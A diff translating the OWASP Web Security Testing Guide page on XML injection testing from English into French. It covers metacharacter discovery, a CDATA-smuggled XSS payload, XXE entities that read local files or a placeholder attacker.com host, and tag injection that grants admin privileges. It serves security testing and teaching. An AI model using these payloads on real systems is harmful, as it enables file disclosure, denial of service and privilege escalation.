@@ -1,25 +1,25 @@
-# Testing for XML Injection
+# Test pour l'injection XML
 
 |ID          |
 |------------|
 |WSTG-INPV-07|
 
-## Summary
+## Sommaire
 
-XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.
+Le test d'injection XML se produit lorsqu'un testeur tente d'injecter un document XML dans l'application. Si l'analyseur XML ne parvient pas à valider contextuellement les données, le test donnera un résultat positif.
 
-This section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (Tag Injection).
+Cette section décrit des exemples pratiques d'injection XML. Dans un premier temps, une communication de style XML sera définie et ses principes de fonctionnement expliqués. Ensuite, la méthode de découverte dans laquelle on essaie d'insérer des métacaractères XML. Une fois la première étape accomplie, le testeur disposera de quelques informations sur la structure XML, il sera donc possible d'essayer d'injecter des données et des balises XML (Tag Injection).
 
-## Test Objectives
+## Objectifs des tests
 
-- Identify XML injection points.
-- Assess the types of exploits that can be attained and their severities.
+- Identifier les points d'injection XML.
+- Évaluer les types d'exploits pouvant être atteints et leur gravité.
 
-## How to Test
+## Comment tester
 
-Let's suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new `user>`node in an `xmlDb` file.
+Supposons qu'il existe une application Web utilisant une communication de style XML afin d'effectuer l'enregistrement des utilisateurs. Cela se fait en créant et en ajoutant un nouveau nœud `user>` dans un fichier `xmlDb`.
 
-Let's suppose the xmlDB file is like the following:
+Supposons que le fichier xmlDB ressemble à ceci :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -39,9 +39,9 @@ Let's suppose the xmlDB file is like the following:
 </users>
 ```
 
-When a user registers himself by filling an HTML form, the application receives the user's data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a `GET` request.
+Lorsqu'un utilisateur s'enregistre en remplissant un formulaire HTML, l'application reçoit les données de l'utilisateur dans une requête standard, qui, par souci de simplicité, sera censée être envoyée sous la forme d'une requête `GET`.
 
-For example, the following values:
+Par exemple, les valeurs suivantes :
 
 ```txt
 Username: tony
@@ -49,11 +49,11 @@ Password: Un6R34kb!e
 E-mail: s4tan@hell.com
 ```
 
-will produce the request:
+produira la requête :
 
 `http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`
 
-The application, then, builds the following node:
+L'application construit alors le nœud suivant :
 
 ```xml
 <user>
@@ -64,7 +64,7 @@ The application, then, builds the following node:
 </user>
 ```
 
-which will be added to the xmlDB:
+qui sera ajouté à la xmlDB :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -90,47 +90,47 @@ which will be added to the xmlDB:
 </users>
 ```
 
-### Discovery
+### Découverte
 
-The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.
+La première étape pour tester une application pour la présence d'une vulnérabilité XML Injection consiste à essayer d'insérer des métacaractères XML.
 
-XML metacharacters are:
+Les métacaractères XML sont :
 
-- Single quote: `'` - When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.
+- Guillemet simple : `'` - Lorsqu'il n'est pas nettoyé, ce caractère peut générer une exception lors de l'analyse XML, si la valeur injectée va faire partie d'une valeur d'attribut dans une balise.
 
-As an example, let's suppose there is the following attribute:
+Par exemple, supposons qu'il existe l'attribut suivant :
 
 `<node attrib='$inputValue'/>`
 
-So, if:
+Alors, si :
 
 `inputValue = foo'`
 
-is instantiated and then is inserted as the attrib value:
+est instancié puis inséré en tant que valeur d'attribut :
 
 `<node attrib='foo''/>`
 
-then, the resulting XML document is not well formed.
+alors, le document XML résultant n'est pas bien formé.
 
-- Double quote: `"` - this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes.
+- Guillemet double : `"` - ce caractère a la même signification que le guillemet simple et peut être utilisé si la valeur de l'attribut est entourée de guillemets doubles.
 
 `<node attrib="$inputValue"/>`
 
-So if:
+Alors, si :
 
 `$inputValue = foo"`
 
-the substitution gives:
+la substitution donne :
 
 `<node attrib="foo""/>`
 
-and the resulting XML document is invalid.
+et le document XML résultant n'est pas valide.
 
-- Angular parentheses: `>` and `<` - By adding an open or closed angular parenthesis in a user input like the following:
+- Parenthèses angulaires : `>` et `<` - En ajoutant une parenthèse angulaire ouverte ou fermée dans une entrée utilisateur comme suit :
 
 `Username = foo<`
 
-the application will build a new node:
+l'application construira un nouveau nœud :
 
 ```xml
 <user>
@@ -141,13 +141,13 @@ the application will build a new node:
 </user>
 ```
 
-but, because of the presence of the open '<', the resulting XML document is invalid.
+mais, à cause de la présence du '<' ouvert, le document XML résultant n'est pas valide.
 
-- Comment tag: `<!--/-->` - This sequence of characters is interpreted as the beginning/end of a comment. So by injecting one of them in Username parameter:
+- Balise de commentaire : `<!--/-->` - Cette séquence de caractères est interprétée comme le début/la fin d'un commentaire. Donc en injectant l'un d'eux dans le paramètre Username :
 
 `Username = foo<!--`
 
-the application will build a node like the following:
+l'application construira un nœud comme celui-ci :
 
 ```xml
 <user>
@@ -158,23 +158,23 @@ the application will build a node like the following:
 </user>
 ```
 
-which won't be a valid XML sequence.
+qui ne sera pas une séquence XML valide.
 
-- Ampersand: `&`- The ampersand is used in the XML syntax to represent entities. The format of an entity is `&symbol;`. An entity is mapped to a character in the Unicode character set.
+- Esperluette : `&`- L'esperluette est utilisée dans la syntaxe XML pour représenter des entités. Le format d'une entité est `&symbol;`. Une entité est mappée à un caractère du jeu de caractères Unicode.
 
-For example:
+Par exemple:
 
 `<tagnode>&lt;</tagnode>`
 
-is well formed and valid, and represents the `<` ASCII character.
+est bien formé et valide, et représente le caractère ASCII `<`.
 
-If `&` is not encoded itself with `&amp;`, it could be used to test XML injection.
+Si `&` n'est pas lui-même encodé avec `&amp;`, il pourrait être utilisé pour tester l'injection XML.
 
-In fact, if an input like the following is provided:
+En fait, si une entrée comme celle-ci est fournie :
 
 `Username = &foo`
 
-a new node will be created:
+un nouveau nœud sera créé :
 
 ```xml
 <user>
@@ -185,11 +185,11 @@ a new node will be created:
 </user>
 ```
 
-but, again, the document is not valid: `&foo` is not terminated with `;` and the `&foo;` entity is undefined.
+mais, encore une fois, le document n'est pas valide : `&foo` ne se termine pas par `;` et l'entité `&foo;` n'est pas définie.
 
-- CDATA section delimiters: `<!\[CDATA\[ / ]]>` - CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.
+- Délimiteurs de section CDATA : `<!\[CDATA\[ / ]]>` - Les sections CDATA sont utilisées pour échapper des blocs de texte contenant des caractères qui seraient autrement reconnus comme du balisage. En d'autres termes, les caractères inclus dans une section CDATA ne sont pas analysés par un analyseur XML.
 
-For example, if there is the need to represent the string `<foo>` inside a text node, a CDATA section may be used:
+Par exemple, s'il est nécessaire de représenter la chaîne `<foo>` à l'intérieur d'un nœud de texte, une section CDATA peut être utilisée :
 
 ```xml
 <node>
@@ -197,25 +197,25 @@ For example, if there is the need to represent the string `<foo>` inside a text 
 </node>
 ```
 
-so that `<foo>` won't be parsed as markup and will be considered as character data.
+de sorte que `<foo>` ne sera pas analysé comme un balisage et sera considéré comme une donnée de caractère.
 
-If a node is created in the following way:
+Si un nœud est créé de la manière suivante :
 
 `<username><![CDATA[<$userName]]></username>`
 
-the tester could try to inject the end CDATA string `]]>` in order to try to invalidate the XML document.
+le testeur pourrait essayer d'injecter la chaîne CDATA de fin `]]>` afin d'essayer d'invalider le document XML.
 
 `userName = ]]>`
 
-this will become:
+cela deviendra :
 
 `<username><![CDATA[]]>]]></username>`
 
-which is not a valid XML fragment.
+qui n'est pas un fragment XML valide.
 
-Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.
+Un autre test est lié à la balise CDATA. Supposons que le document XML est traité pour générer une page HTML. Dans ce cas, les délimiteurs de section CDATA peuvent être simplement éliminés, sans inspecter davantage leur contenu. Ensuite, il est possible d'injecter des balises HTML, qui seront incluses dans la page générée, en contournant complètement les routines de nettoyage existantes.
 
-Let's consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.
+Prenons un exemple concret. Supposons que nous ayons un nœud contenant du texte qui sera affiché à l'utilisateur.
 
 ```xml
 <html>
@@ -223,11 +223,11 @@ Let's consider a concrete example. Suppose we have a node containing some text t
 </html>
 ```
 
-Then, an attacker can provide the following input:
+Ensuite, un attaquant peut fournir l'entrée suivante :
 
 `$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`
 
-and obtain the following node:
+et obtenir le nœud suivant :
 
 ```xml
 <html>
@@ -235,7 +235,7 @@ and obtain the following node:
 </html>
 ```
 
-During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:
+Lors du traitement, les délimiteurs de section CDATA sont éliminés, générant le code HTML suivant :
 
 ```html
 <script>
@@ -243,11 +243,11 @@ During the processing, the CDATA section delimiters are eliminated, generating t
 </script>
 ```
 
-The result is that the application is vulnerable to XSS.
+Le résultat est que l'application est vulnérable à XSS.
 
-External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.
+Entité externe : l'ensemble des entités valides peut être étendu en définissant de nouvelles entités. Si la définition d'une entité est un URI, l'entité est appelée une entité externe. Sauf configuration contraire, les entités externes forcent l'analyseur XML à accéder à la ressource spécifiée par l'URI, par exemple, un fichier sur la machine locale ou sur un système distant. Ce comportement expose l'application aux attaques XML eXternal Entity (XXE), qui peuvent être utilisées pour effectuer un déni de service du système local, obtenir un accès non autorisé aux fichiers sur la machine locale, analyser des machines distantes et effectuer un déni de service de systèmes distants. .
 
-To test for XXE vulnerabilities, one can use the following input:
+Pour tester les vulnérabilités XXE, on peut utiliser l'entrée suivante :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -256,9 +256,9 @@ To test for XXE vulnerabilities, one can use the following input:
         <foo>&xxe;</foo>
 ```
 
-This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.
+Ce test peut planter le serveur Web (sur un système UNIX) si l'analyseur XML tente de remplacer l'entité par le contenu du fichier /dev/random.
 
-Other useful tests are the following:
+D'autres tests utiles sont les suivants :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -278,11 +278,11 @@ Other useful tests are the following:
         <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
 ```
 
-### Tag Injection
+### Injection de balises
 
-Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.
+Une fois la première étape accomplie, le testeur disposera de quelques informations sur la structure du document XML. Ensuite, il est possible d'essayer d'injecter des données et des balises XML. Nous montrerons un exemple de la façon dont cela peut conduire à une attaque par escalade de privilèges.
 
-Let's considering the previous application. By inserting the following values:
+Considérons l'application précédente. En insérant les valeurs suivantes :
 
 ```txt
 Username: tony
@@ -290,7 +290,7 @@ Password: Un6R34kb!e
 E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
 ```
 
-the application will build a new node and append it to the XML database:
+l'application construira un nouveau nœud et l'ajoutera à la base de données XML :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -318,11 +318,11 @@ the application will build a new node and append it to the XML database:
 </users>
 ```
 
-The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges.
+Le fichier XML résultant est bien formé. De plus, il est probable que, pour l'utilisateur tony, la valeur associée à la balise userid soit celle apparaissant en dernier, c'est-à-dire 0 (l'ID administrateur). En d'autres termes, nous avons injecté un utilisateur avec des privilèges administratifs.
 
-The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don't comply with it.
+Le seul problème est que la balise userid apparaît deux fois dans le dernier nœud utilisateur. Souvent, les documents XML sont associés à un schéma ou à une DTD et seront rejetés s'ils ne s'y conforment pas.
 
-Let's suppose that the XML document is specified by the following DTD:
+Supposons que le document XML est spécifié par la DTD suivante :
 
 ```xml
 <!DOCTYPE users [
@@ -335,9 +335,9 @@ Let's suppose that the XML document is specified by the following DTD:
 ]>
 ```
 
-Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs.
+Notez que le nœud userid est défini avec la cardinalité 1. Dans ce cas, l'attaque que nous avons montrée précédemment (et d'autres attaques simples) ne fonctionnera pas si le document XML est validé par rapport à sa DTD avant tout traitement.
 
-However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:
+Cependant, ce problème peut être résolu, si le testeur contrôle la valeur de certains nœuds précédant le nœud incriminé (userid, dans cet exemple). En fait, le testeur peut commenter un tel nœud, en injectant une séquence de début/fin de commentaire :
 
 ```txt
 Username: tony
@@ -345,7 +345,7 @@ Password: Un6R34kb!e</password><!--
 E-mail: --><userid>0</userid><mail>s4tan@hell.com
 ```
 
-In this case, the final XML database is:
+Dans ce cas, la base de données XML finale est :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -371,11 +371,11 @@ In this case, the final XML database is:
 </users>
 ```
 
-The original `userid` node has been commented out, leaving only the injected one. The document now complies with its DTD rules.
+Le nœud original `userid` a été commenté, ne laissant que celui injecté. Le document est désormais conforme à ses règles DTD.
 
-## Source Code Review
+## Examen du code source
 
-The following Java API may be vulnerable to XXE if they are not configured properly.
+L'API Java suivante peut être vulnérable à XXE si elle n'est pas configurée correctement.
 
 ```text
 javax.xml.parsers.DocumentBuilder
@@ -399,28 +399,28 @@ XMLReader
 Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
 ```
 
-Check source code if the docType, external DTD, and external parameter entities are set as forbidden uses.
+Vérifiez le code source si les entités docType, DTD externe et paramètre externe sont définies comme des utilisations interdites.
 
-- [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [Aide-mémoire sur la prévention des entités externes XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
 
-In addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1.
+De plus, le lecteur Java POI office peut être vulnérable à XXE si la version est inférieure à 3.10.1.
 
-The version of POI library can be identified from the filename of the JAR. For example,
+La version de la bibliothèque POI peut être identifiée à partir du nom de fichier du JAR. Par exemple,
 
 - `poi-3.8.jar`
 - `poi-ooxml-3.8.jar`
 
-The followings source code keyword may apply to C.
+Le mot clé de code source suivant peut s'appliquer à C.
 
-- libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
-- libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader
+- libxml2 : xmlCtxtReadMemory, xmlCtxtUseOptions, xmlParseInNodeContext, xmlReadDoc, xmlReadFd, xmlReadFile, xmlReadIO, xmlReadMemory, xmlCtxtReadDoc, xmlCtxtReadFd, xmlCtxtReadFile, xmlCtxtReadIO
+- libxerces-c : XercesDOMParser, SAXParser, SAX2XMLReader
 
-## Tools
+## Outils
 
-- [XML Injection Fuzz Strings (from wfuzz tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
+- [Chaînes Fuzz d'injection XML (de l'outil wfuzz)] (https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
 
-## References
+## Références
 
-- [XML Injection](https://www.whitehatsec.com/glossary/content/xml-injection)
-- [Gregory Steuck, "XXE (Xml eXternal Entity) attack"](https://www.securityfocus.com/archive/1/297714)
-- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [Injection XML](https://www.whitehatsec.com/glossary/content/xml-injection)
+- [Gregory Steuck, "attaque XXE (Xml eXternal Entity)"](https://www.securityfocus.com/archive/1/297714)
+- [Aide-mémoire de prévention OWASP XXE] (https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
